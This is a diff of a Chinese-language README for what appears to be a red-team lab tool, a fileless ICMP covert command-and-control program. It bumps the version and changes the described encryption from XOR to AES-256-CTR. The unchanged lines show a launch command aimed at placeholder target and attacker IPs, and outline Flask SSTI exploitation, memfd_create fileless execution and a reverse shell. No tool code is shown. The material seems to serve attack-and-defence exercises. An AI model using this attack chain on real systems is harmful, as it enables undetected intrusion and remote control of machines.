@@ -221,7 +221,7 @@ sudo .venv/bin/python3 red_team/red_attacker.py -t <TARGET_IP> -l <ATTACKER_IP>
 預期輸出：
 ```
 +====================================================+
-|     Red Team  Fileless ICMP C2  v1.0               |
+|     Red Team  Fileless ICMP C2  v2.0               |
 +====================================================+
   Target : <TARGET_IP>
   C2 IP  : <ATTACKER_IP>
@@ -266,7 +266,7 @@ target-machine
 
 - **SSTI**：Flask f-string + render_template_string 漏洞
 - **Fileless Execution**：memfd_create 在記憶體中建立匿名 fd，不寫入磁碟
-- **ICMP Covert C2**：指令透過 ICMP echo request payload 傳輸，XOR 加密
+- **ICMP Covert C2**：指令透過 ICMP echo request payload 傳輸，AES-256-CTR 加密
 - 藍方完全沒有察覺（沒有任何偵測機制運行）
 - MITRE ATT&CK: **T1190, T1059.006, T1620, T1027, T1095**
 
@@ -536,7 +536,7 @@ TCP bypass     port detect
 | T1190 | Exploit Public-Facing App | SSTI injection |
 | T1059.006 | Python Execution | memfd loader + reverse shell |
 | T1620 | Reflective Code Loading | memfd_create → execve |
-| T1027 | Obfuscation | Double Base64 + XOR |
+| T1027 | Obfuscation | Double Base64 + AES-256-CTR |
 | T1095 | Non-App Layer Protocol | ICMP covert C2 |
 | T1071.001 | Application Layer Protocol | TCP reverse shell |
 
